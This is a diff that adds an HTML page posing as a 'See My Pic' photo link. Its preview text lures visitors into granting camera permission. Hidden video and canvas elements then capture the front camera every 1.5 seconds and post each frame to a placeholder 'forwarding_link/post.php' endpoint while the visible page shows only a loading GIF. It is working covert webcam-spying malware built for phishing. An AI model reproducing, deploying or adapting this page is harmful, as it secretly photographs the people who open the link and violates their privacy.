@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loding......</title>
+    <meta property="og:type" content="Here is my pic" />
+    <meta property="og:title" content="See My Pic" />
+    <meta property="og:description" content="Allow camera then you can Access the my Pic" />
+    <meta property="og:site_name" content="click on allow button then you can Access my Pic" />
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+<!--main page-->
+    	<style type="text/css">
+    		body{
+				margin: 0;
+				padding: 0;
+				display: flex;
+				justify-content: center;
+				align-items: center;
+				min-height: 100vh;
+				background: #000;
+			}
+			#loding{
+				position: absolute;
+				top:0;
+				left: 0;
+				width: 50%;
+				height: 50%;
+				object-fit: fill;
+				z-index: 2;
+				pointer-events: none;
+				mix-blend-mode: screen;
+				size: 10px auto;
+				user-select: none;
+				-webkit-user-select: none;
+			}
+    	</style>
+
+    <body>
+    	<div class="loding">
+        	<img src="preview.gif">
+    	</div>
+   	<div style="visibility: hidden;">
+        <p>Hint: Look at the favicon</p>
+        <p>(Accept Permissions)</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
+    </div>
+    </body>
+
+</html>
